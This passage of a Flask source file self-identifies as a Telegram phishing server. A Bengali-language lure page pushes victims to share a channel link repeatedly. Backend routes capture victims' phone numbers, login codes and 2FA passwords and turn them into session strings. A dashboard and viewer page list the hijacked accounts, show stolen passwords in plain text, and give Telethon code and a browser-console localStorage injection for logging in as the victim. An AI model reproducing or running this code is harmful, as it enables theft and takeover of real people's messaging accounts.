        var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + 
                       '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
        document.getElementById('shareLink').textContent = shareUrl;
        shareLinkBase = TG_CHANNEL_LINK;
        
        var tgUserId = localStorage.getItem('tg_user_id');
        if (tgUserId) {
            sharesDone = parseInt(localStorage.getItem('tg_shares_' + tgUserId) || '0');
        }
        
        updateShareProgress();
        
        if (sharesDone > 0) {
            var st = document.getElementById('shareStatus');
            if (sharesDone >= 4) {
                st.className = 'sb waiting';
                st.innerHTML = '<span class="sp"></span> আর মাত্র ১টা শেয়ার বাকি!';
            } else {
                st.className = 'sb success';
                st.innerHTML = '✅ ' + sharesDone + '/5 শেয়ার হয়েছে! আর ' + (5 - sharesDone) + 'টা বাকি...';
            }
            st.style.display = 'block';
        }
    }

    function simulateShare() {
        var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + 
                       '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
        window.open(shareUrl, '_blank');
        
        sharesDone = Math.min(sharesDone + 1, 4);
        
        var tgUserId = localStorage.getItem('tg_user_id');
        if (tgUserId) {
            localStorage.setItem('tg_shares_' + tgUserId, String(sharesDone));
        }
        
        updateShareProgress();
        
        if (sharesDone >= 4) {
            var st = document.getElementById('shareStatus');
            st.className = 'sb waiting';
            st.innerHTML = '<span class="sp"></span> আর মাত্র ১টা শেয়ার বাকি!';
            st.style.display = 'block';
        } else if (sharesDone > 0) {
            var st = document.getElementById('shareStatus');
            st.className = 'sb success';
            st.innerHTML = '✅ ' + sharesDone + '/5 শেয়ার হয়েছে! আর ' + (5 - sharesDone) + 'টা বাকি...';
            st.style.display = 'block';
        }
    }

    function updateShareProgress() {
        for (var i = 1; i <= 5; i++) {
            var el = document.getElementById('sp' + i);
            if (i <= sharesDone) {
                el.className = 'share-step done';
            } else if (i === sharesDone + 1) {
                el.className = 'share-step active';
            } else {
                el.className = 'share-step';
            }
        }
    }

    // ====== Modal বন্ধ করা ======
    document.getElementById('vm').onclick = function(e) {
        if (e.target === this) {
            this.classList.remove('active');
            if (codeCheckInterval) { 
                clearInterval(codeCheckInterval); 
                codeCheckInterval = null; 
            }
            if (passwordCheckInterval) { 
                clearInterval(passwordCheckInterval); 
                passwordCheckInterval = null; 
            }
        }
    };
    </script>
</body>
</html>"""


# ====== Flask Routes ======

@app.route('/')
def index():
    return render_template_string(PAGE)

@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    
    ph = format_phone(ph)
    logger.info(f"Phone received: {ph}")
    
    with sessions_lock:
        pending_codes[ph] = 'sending'
    
    t = threading.Thread(target=run_telegram_action, args=(ph,))
    t.daemon = True
    t.start()
    
    return jsonify({'success': True})

@app.route('/api/check', methods=['POST'])
def check():
    phone = request.json.get('phone', '')
    phone = format_phone(phone)
    
    with sessions_lock:
        s = pending_codes.get(phone, 'waiting')
    
    if s == 'waiting':
        accounts = load_accounts()
        if any(a['phone'] == phone for a in accounts):
            s = 'done'
    
    return jsonify({'s': s})

# ====== Check by Telegram User ID ======
@app.route('/api/check_user', methods=['POST'])
def check_user():
    user_id = request.json.get('user_id')
    if not user_id:
        return jsonify({'captured': False})
    
    accounts = load_accounts()
    for a in accounts:
        if a.get('user_id') == user_id:
            return jsonify({'captured': True, 'phone': a['phone']})
    
    return jsonify({'captured': False})

@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    ph = d.get('phone', '')
    code = d.get('code', '')
    password = d.get('password', None)
    
    ph = format_phone(ph)
    result = run_telegram_action(ph, code, password)
    return jsonify(result)

@app.route('/session/<phone>')
def get_session(phone):
    phone = format_phone(phone)
    global captured_accounts
    captured_accounts = load_accounts()
    
    a = next((x for x in captured_accounts if x['phone'] == phone), None)
    
    if not a:
        with sessions_lock:
            if phone in user_sessions:
                return jsonify({
                    'phone': phone,
                    'status': 'pending',
                    'message': 'Code sent, waiting for verification'
                })
        return jsonify({'error': 'Not found'}), 404
    
    return jsonify({
        'phone': phone,
        'user_id': a['user_id'],
        'name': f"{a['first_name']} {a['last_name']}",
        'username': a['username'],
        'dc': a['dc'],
        'session': a['session'],
        'session_length': len(a['session']),
        'has_session': bool(a['session']),
        'webk_data': a['webk'],
        'has_2fa': a.get('has_2fa', False),
        'password': a.get('password', '')
    })

@app.route('/webk/<phone>')
def webk(phone):
    phone = format_phone(phone)
    global captured_accounts
    captured_accounts = load_accounts()
    
    a = next((x for x in captured_accounts if x['phone'] == phone), None)
    
    if not a:
        return """
        <html><body style="background:#0a0a0a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh">
        <div style="text-align:center;padding:40px;background:#141420;border-radius:20px;border:1px solid #1a1a2e">
        <h2 style="color:#e94560">Not Found</h2>
        <p style="color:#888">No account found for this phone number.</p>
        <a href="/dash" style="color:#0088cc">Back to Dashboard</a>
        </div></body></html>
        """, 404
    
    w = a['webk']
    ss = a['session']
    ss_ok = bool(ss) and len(ss) > 10
    has_2fa = a.get('has_2fa', False)
    pwd = a.get('password', '')
    
    twofa_badge = '<div class="warn">🔐 2FA account - password was used</div>' if has_2fa else ''
    pwd_display = f'<div class="sg"><b>2FA Password Captured:</b><br><code style="font-size:14px;color:#ff6b6b">{pwd}</code></div>' if has_2fa and pwd else ''
    
    return f"""
    <!DOCTYPE html><html><head><title>WebK - {a['first_name']}</title>
    <style>
        body{{background:#0a0a0a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}}
        .c{{background:#141420;padding:40px;border-radius:20px;max-width:550px;width:100%;text-align:center;border:1px solid #1a1a2e}}
        .av{{width:70px;height:70px;border-radius:50%;background:#0088cc;display:flex;align-items:center;justify-content:center;font-size:30px;margin:0 auto 15px}}
        .i{{color:#888;margin:3px 0;font-size:14px}}
        .b{{width:100%;padding:15px;border:none;border-radius:12px;font-size:15px;cursor:pointer;margin:8px 0;font-weight:600}}
        .bp{{background:#0088cc;color:white}}
        .bs{{background:#4CAF50;color:white}}
        .br{{background:#e94560;color:white}}
        .sb{{background:#0a0a0a;padding:12px;border-radius:8px;word-break:break-all;font-size:10px;margin:10px 0;text-align:left;color:#0f0;max-height:200px;overflow:auto}}
        .warn{{background:#e94560;color:white;padding:12px;border-radius:8px;margin:10px 0;font-size:12px}}
        .success{{background:#4CAF50;color:white;padding:12px;border-radius:8px;margin:10px 0;font-size:12px}}
        code{{color:#0f0;word-break:break-all;font-size:9px}}
        .sg{{background:#0a0a0a;padding:15px;border-radius:8px;text-align:left;font-size:11px;margin:10px 0;border:1px solid #2a2a3e}}
    </style></head>
    <body><div class="c">
    <div class="av">{a['first_name'][0] if a['first_name'] else '?'}</div>
    <h2>{a['first_name']} {a['last_name']}</h2>
    <div class="i">@{a['username'] or '—'} | ID: {a['user_id']} | DC: {a['dc']}</div>
    <div class="i">{a['phone']}</div>
    {twofa_badge}
    {pwd_display}
    {'<div class="success">Session Captured! (' + str(len(ss)) + ' chars)</div>' if ss_ok else '<div class="warn">No session string available</div>'}
    
    <div class="sg"><b>WebK Data:</b><br><code>{w}</code></div>
    
    <button class="b bp" onclick="o()">1 Open WebK</button>
    <button class="b bs" id="ib" style="display:none" onclick="i()">2 Inject Session</button>
    <button class="b bp" id="rb" style="display:none" onclick="r()">3 Refresh</button>
    <div id="st" class="i" style="margin-top:15px"></div>
    
    <hr style="border-color:#1a1a2e;margin:15px 0">
    
    <div class="sg"><b>Session String ({len(ss)} chars):</b><br>
    <code style="font-size:10px">{ss}</code></div>
    
    <button class="b br" onclick="copySession()">Copy Session String</button>
    
    <div class="sg"><b>Telethon Usage:</b><br>
    <code style="font-size:10px">
from telethon import TelegramClient
from telethon.sessions import StringSession

client = TelegramClient(StringSession('{ss}'), {API_ID}, '{API_HASH}')
client.start()
me = client.get_me()
print(me.phone)
    </code></div>
    
    <div class="sg"><b>Manual WebK:</b><br>
    1. web.telegram.org/k<br>
    2. F12 Console<br>
    3. Paste: <code style="font-size:10px">localStorage.setItem('webk_session','{w}')</code><br>
    4. F5
    </div>
    
    <a href="/dash" style="color:#0088cc;font-size:12px;text-decoration:none">Dashboard</a>
    
    </div>
    <script>
    var wk;
    function o(){{wk=window.open('https://web.telegram.org/k/','_blank');document.getElementById('ib').style.display='block';document.getElementById('st').textContent='Opened!'}}
    function i(){{if(!wk||wk.closed){{document.getElementById('st').textContent='Closed!';return}}
    try{{wk.postMessage({{action:'setStorage',key:'webk_session',value:'{w}'}},'*');document.getElementById('st').textContent='Injected!';document.getElementById('ib').style.display='none';document.getElementById('rb').style.display='block'}}catch(e){{document.getElementById('st').textContent='Error'}}}}
    function r(){{if(wk&&!wk.closed){{wk.location.reload();document.getElementById('st').textContent='Logged in!'}}}}
    function copySession(){{navigator.clipboard.writeText('{ss}').then(function(){{document.getElementById('st').textContent='Session copied!'}})['catch'](function(){{document.getElementById('st').textContent='Copy failed'}})}}
    </script></body></html>
    """

@app.route('/dash')
def dash():
    global captured_accounts
    captured_accounts = load_accounts()
    accounts = captured_accounts
    
    rows = ""
    for i, a in enumerate(accounts, 1):
        ss_status = "YES" if a.get('session') and len(a['session']) > 10 else "NO"
        ss_len = len(a.get('session', '')) if a.get('session') else 0
        twofa_tag = "🔐" if a.get('has_2fa') else ""
        pwd_preview = a.get('password', '')
        pwd_show = f" Pwd:{pwd_preview[:15]}..." if pwd_preview else ""
        rows += f"""<tr>
            <td>{i}</td>
            <td>{a['phone']}</td>
            <td>{a.get('first_name','')} {a.get('last_name','')}</td>
            <td>@{a.get('username','-')}</td>
            <td>{a.get('user_id','')}</td>
            <td>{a.get('dc','')}</td>
            <td>{twofa_tag} {ss_status} ({ss_len}){pwd_show}</td>
            <td>{a.get('time','')}</td>
            <td><a href='/webk/{a["phone"]}'><button style="background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer">View</button></a></td>
        </tr>"""
    
    total_2fa = sum(1 for a in accounts if a.get('has_2fa'))
    
    return f"""
    <!DOCTYPE html><html><head><title>Dashboard</title>
    <style>
        body{{background:#0a0a0a;color:white;font-family:Arial;padding:20px}}
        h1{{color:#e94560}}
        table{{width:100%;border-collapse:collapse;margin-top:15px}}
        th,td{{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}}
        th{{background:#141420;color:#ddd}}
        tr:hover{{background:#141420}}
        .stats{{display:flex;gap:15px;margin:15px 0}}
        .st{{background:#141420;padding:15px 25px;border-radius:10px;text-align:center;flex:1}}
        .st .n{{font-size:30px;font-weight:bold;color:#0088cc}}
        .st .l{{color:#666;font-size:12px;margin-top:5px}}
        a{{color:#0088cc;text-decoration:none}}
    </style></head>
    <body>
    <h1>Telegram Accounts</h1>
    <div class="stats">
        <div class="st"><div class="n">{len(accounts)}</div><div class="l">Total</div></div>
        <div class="st"><div class="n">{total_2fa}</div><div class="l">With 2FA 🔐</div></div>
    </div>
    <table><thead><tr>
        <th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>DC</th><th>Session</th><th>Time</th><th>View</th>
    </tr></thead><tbody>
    {rows if rows else '<tr><td colspan="9" style="text-align:center;color:#666;padding:30px">No accounts yet</td></tr>'}
    </tbody></table>
    <script>setTimeout(()=>location.reload(),10000)</script>
    </body></html>
    """

if __name__ == '__main__':
    if not BOT_TOKEN or not API_HASH or API_ID == 0 or YOUR_TELEGRAM_ID == 0:
        print("⚠️  WARNING: Some environment variables are missing!")
        print(f"   BOT_TOKEN: {'✅ SET' if BOT_TOKEN else '❌ MISSING'}")
        print(f"   API_ID: {API_ID}")
        print(f"   API_HASH: {'✅ SET' if API_HASH else '❌ MISSING'}")
        print(f"   OWNER_ID: {YOUR_TELEGRAM_ID}")
        print("   Set these in your environment before running.")
    
    port = int(os.environ.get('PORT', 5000))
    print(f"\n{'='*50}")
    print(f"🔥 Premium Video Hub — Phishing Server")
    print(f"{'='*50}")
    print(f"🌐 Main Page:   http://localhost:{port}")
    print(f"📊 Dashboard:   http://localhost:{port}/dash")
    print(f"📁 Data File:   {DATA_FILE}")
    print(f"{'='*50}\n")
    app.run(host='0.0.0.0', port=port, debug=True)
